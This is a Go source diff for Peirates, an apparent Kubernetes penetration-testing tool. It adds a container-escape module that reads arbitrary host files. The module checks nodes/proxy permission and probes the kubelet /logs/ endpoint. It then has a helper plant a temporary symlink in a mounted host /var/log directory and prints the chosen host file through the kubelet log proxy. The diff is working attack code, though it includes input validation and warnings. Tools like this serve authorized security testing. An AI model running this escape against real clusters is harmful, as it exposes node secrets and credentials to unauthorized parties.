@@ -6,15 +6,23 @@ import (
 	"errors"
 	"fmt"
 	"io"
+	"net/http"
 	"os"
+	"os/signal"
+	"path"
+	"path/filepath"
 	"strings"
+	"syscall"
 
 	"github.com/ergochat/readline"
+	"github.com/inguardians/peirates/internal/kube"
 	"github.com/inguardians/peirates/internal/modules/containerescape"
 	"github.com/inguardians/peirates/internal/modules/dockersocket"
 	"github.com/inguardians/peirates/internal/modules/escapeutil"
+	"github.com/inguardians/peirates/internal/modules/hostlog"
 	"github.com/inguardians/peirates/internal/modules/hostroot"
 	"golang.org/x/term"
+	"k8s.io/apimachinery/pkg/util/validation"
 )
 
 const dockerImagePrompt = "Existing image reference (must contain /bin/sh and chroot): "
@@ -27,6 +35,7 @@ var probeDockerSocket = dockersocket.Probe
 var runDockerSocketBreakout = dockersocket.Launch
 var runHostRootBreakout = hostroot.Launch
 var runHostRootBreakoutAt = hostroot.LaunchAt
+var readHostLogFile = hostlog.ReadFile
 var findAvailableDockerSocketPaths = func() []string {
 	candidates := escapeutil.DockerSocketPaths(os.Getenv("DOCKER_HOST"), nil)
 	return availableDockerSocketPaths(candidates)
@@ -40,6 +49,221 @@ var launchDockerSocketBreakout = func() error {
 
 var launchHostRootBreakout = func() error {
 	return launchHostRootBreakoutWithStreams(os.Stdin, os.Stdout, os.Stderr)
+}
+
+var launchHostLogSymlinkRead = func(connection ServerInfo) error {
+	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
+	defer stop()
+	return launchHostLogSymlinkReadWithStreams(
+		ctx, connection, kube.NewClient(), os.Getenv, os.Stdin, os.Stdout, os.Stderr,
+	)
+}
+
+type kubeletLogProxyFetcher struct {
+	client     *kube.Client
+	connection ServerInfo
+	node       string
+}
+
+func (fetcher *kubeletLogProxyFetcher) Probe(ctx context.Context) error {
+	if fetcher.client == nil {
+		return errors.New("kubernetes client is required")
+	}
+	allowed, err := fetcher.client.AuthCanIResource(ctx, fetcher.connection, kube.ResourceAttributes{
+		Verb:        "get",
+		Resource:    "nodes",
+		Subresource: "proxy",
+		Namespace:   "",
+	})
+	if err != nil {
+		return fmt.Errorf("review get access to nodes/proxy: %w", err)
+	}
+	if !allowed {
+		return errors.New("authorization denied for get access to nodes/proxy")
+	}
+	route, err := kube.NodeProxyLogPath(fetcher.node)
+	if err != nil {
+		return err
+	}
+	options := kube.RawRequestOptions{
+		Method:            http.MethodHead,
+		APIPath:           route,
+		Timeout:           kube.DefaultRawRequestTimeout,
+		MaxResponseBytes:  1,
+		MaxErrorBodyBytes: kube.DefaultRawErrorBodyLimit,
+	}
+	_, err = fetcher.rawRequest(ctx, options)
+	var statusError *kube.HTTPStatusError
+	if !errors.As(err, &statusError) || statusError.StatusCode != http.StatusMethodNotAllowed {
+		if err != nil {
+			return fmt.Errorf("probe kubelet /logs/ through nodes/proxy: %w", err)
+		}
+		return nil
+	}
+
+	// Some proxies reject HEAD even when the file server is enabled. A one-byte
+	// GET proves the route without retaining its directory listing.
+	options.Method = http.MethodGet
+	_, err = fetcher.rawRequest(ctx, options)
+	if errors.Is(err, kube.ErrRawResponseTooLarge) {
+		return nil
+	}
+	if err != nil {
+		return fmt.Errorf("probe kubelet /logs/ through nodes/proxy: %w", err)
+	}
+	return nil
+}
+
+func (fetcher *kubeletLogProxyFetcher) Read(ctx context.Context, logPath string) ([]byte, error) {
+	components, err := splitHostLogPath(logPath)
+	if err != nil {
+		return nil, err
+	}
+	route, err := kube.NodeProxyLogPath(fetcher.node, components...)
+	if err != nil {
+		return nil, err
+	}
+	return fetcher.rawRequest(ctx, kube.RawRequestOptions{
+		Method:            http.MethodGet,
+		APIPath:           route,
+		Timeout:           kube.DefaultRawRequestTimeout,
+		MaxResponseBytes:  kube.DefaultRawResponseLimit,
+		MaxErrorBodyBytes: kube.DefaultRawErrorBodyLimit,
+	})
+}
+
+func (fetcher *kubeletLogProxyFetcher) rawRequest(ctx context.Context, options kube.RawRequestOptions) ([]byte, error) {
+	request := fetcher.client.RawAPIRequest
+	if request == nil {
+		request = kube.RawRequest
+	}
+	return request(ctx, fetcher.connection, options)
+}
+
+func splitHostLogPath(logPath string) ([]string, error) {
+	if logPath == "" || path.IsAbs(logPath) || path.Clean(logPath) != logPath || strings.ContainsRune(logPath, '\x00') {
+		return nil, fmt.Errorf("invalid relative kubelet log path %q", logPath)
+	}
+	components := strings.Split(logPath, "/")
+	for _, component := range components {
+		if component == "" || component == "." || component == ".." {
+			return nil, fmt.Errorf("invalid relative kubelet log path %q", logPath)
+		}
+	}
+	return components, nil
+}
+
+func launchHostLogSymlinkReadWithStreams(
+	ctx context.Context,
+	connection ServerInfo,
+	client *kube.Client,
+	getenv func(string) string,
+	stdin io.Reader,
+	stdout, stderr io.Writer,
+) error {
+	reader := bufio.NewReader(stdin)
+	mountPoint, err := readEscapePromptLine(reader, stdout, "Mounted host-log path [auto-detect]: ")
+	if err != nil && !errors.Is(err, io.EOF) {
+		return fmt.Errorf("read host-log mount point: %w", err)
+	}
+	if err := validateOptionalHostLogMountPoint(mountPoint); err != nil {
+		return err
+	}
+
+	defaultNode := ""
+	if getenv != nil {
+		defaultNode = strings.TrimSpace(getenv("NODE_NAME"))
+	}
+	nodePrompt := "Kubernetes node name: "
+	if defaultNode != "" {
+		nodePrompt = fmt.Sprintf("Kubernetes node name [%s]: ", defaultNode)
+	}
+	node, err := readEscapePromptLine(reader, stdout, nodePrompt)
+	if err != nil && !errors.Is(err, io.EOF) {
+		return fmt.Errorf("read Kubernetes node name: %w", err)
+	}
+	if node == "" {
+		node = defaultNode
+	}
+	if _, err := kube.NodeProxyLogPath(node); err != nil {
+		return fmt.Errorf("invalid Kubernetes node name: %w", err)
+	}
+	if problems := validation.IsDNS1123Subdomain(node); len(problems) > 0 {
+		return fmt.Errorf("invalid Kubernetes node name %q: %s", node, strings.Join(problems, "; "))
+	}
+
+	target, err := readEscapePromptLine(reader, stdout, "Absolute host target path: ")
+	if err != nil && !errors.Is(err, io.EOF) {
+		return fmt.Errorf("read host target path: %w", err)
+	}
+	if err := validateHostLogTarget(target); err != nil {
+		return err
+	}
+
+	requestedMount := mountPoint
+	if requestedMount == "" {
+		requestedMount = "[auto-detect]"
+	}
+	fmt.Fprintf(stdout, "Requested host-log mount: %s\n", requestedMount)
+	fmt.Fprintf(stdout, "Kubernetes node: %s\n", node)
+	fmt.Fprintf(stdout, "Host target: %s\n", target)
+	fmt.Fprintln(stderr, "Warning: this action can expose sensitive node data and temporarily creates one symlink under the selected host-log mount.")
+
+	result, err := readHostLogFile(ctx, hostlog.Options{
+		MountPoint: mountPoint,
+		TargetPath: target,
+		Fetcher: &kubeletLogProxyFetcher{
+			client:     client,
+			connection: connection,
+			node:       node,
+		},
+	})
+	if err != nil {
+		return err
+	}
+
+	fmt.Fprintln(stdout, "Kubelet /logs/ API proxy preflight succeeded.")
+	fmt.Fprintf(stdout, "Selected host-log mount: %s (node path %s)\n", result.MountPoint, result.HostLogRoot)
+	if result.HostPathOriginUnproven {
+		fmt.Fprintln(stdout, "Mountinfo did not retain a /var/log root for the exact /var/log destination; hostPath origin remains unproven.")
+	}
+	fmt.Fprintf(stdout, "Temporary host-log symlink removed: %s\n", filepath.Join(result.MountPoint, path.Base(result.LogPath)))
+	fmt.Fprintf(stdout, "Reached Kubernetes node %s through the kubelet log proxy; this does not prove access to the physical host.\n", node)
+	fmt.Fprintln(stdout, "Host file content follows (treat as sensitive):")
+	if _, err := stdout.Write(result.Content); err != nil {
+		return fmt.Errorf("write host file content: %w", err)
+	}
+	return nil
+}
+
+func validateOptionalHostLogMountPoint(mountPoint string) error {
+	if mountPoint == "" {
+		return nil
+	}
+	if strings.ContainsRune(mountPoint, '\x00') || !filepath.IsAbs(mountPoint) {
+		return fmt.Errorf("host-log mount point %q must be absolute", mountPoint)
+	}
+	if cleaned := filepath.Clean(mountPoint); cleaned != mountPoint {
+		return fmt.Errorf("host-log mount point %q is not normalized; use %q", mountPoint, cleaned)
+	}
+	return nil
+}
+
+func validateHostLogTarget(target string) error {
+	if target == "" {
+		return errors.New("absolute host target path is required")
+	}
+	if strings.ContainsRune(target, '\x00') || !filepath.IsAbs(target) {
+		return fmt.Errorf("host target path %q must be absolute", target)
+	}
+	cleaned := filepath.Clean(target)
+	if cleaned != target {
+		return fmt.Errorf("host target path %q is not normalized; use %q", target, cleaned)
+	}
+	if cleaned == string(filepath.Separator) {
+		return errors.New("host target path must name one file and must not be filesystem root")
+	}
+	return nil
 }
 
 func launchDockerSocketBreakoutWithStreams(stdin io.Reader, stdout, stderr io.Writer) error {
